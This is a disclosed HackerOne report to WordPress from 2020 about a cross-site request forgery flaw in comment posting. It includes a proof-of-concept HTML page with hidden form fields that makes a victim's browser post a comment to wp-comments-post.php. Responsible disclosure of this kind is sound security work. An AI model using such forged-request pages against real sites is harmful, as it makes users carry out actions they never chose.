# CSRF on comment post

## Report Details
- **Report ID**: 914232
- **URL**: https://hackerone.com/reports/914232
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-07-02T17:11:35.356Z
- **Disclosed**: 2020-07-16T11:14:43.361Z

## Reporter
- **Username**: lamscun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
Hi Wordpress,

I just found an CSRF on comment post. It allow attacker make victim comments on a post.

## Steps To Reproduce:
Attacker send to victim a link with content below:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/wordpress/wordpress-5.4.2/wordpress/wp-comments-post.php" method="POST">
      <input type="hidden" name="comment" value="csrf&#95;comment" />
      <input type="hidden" name="submit" value="Post&#32;Comment" />
      <input type="hidden" name="comment&#95;post&#95;ID" value="29" />
      <input type="hidden" name="comment&#95;parent" value="0" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

Video poc: {F891759}

## Impact

Attacker make victim comments on a post.

## Attachments
- comment_csrf.wmv
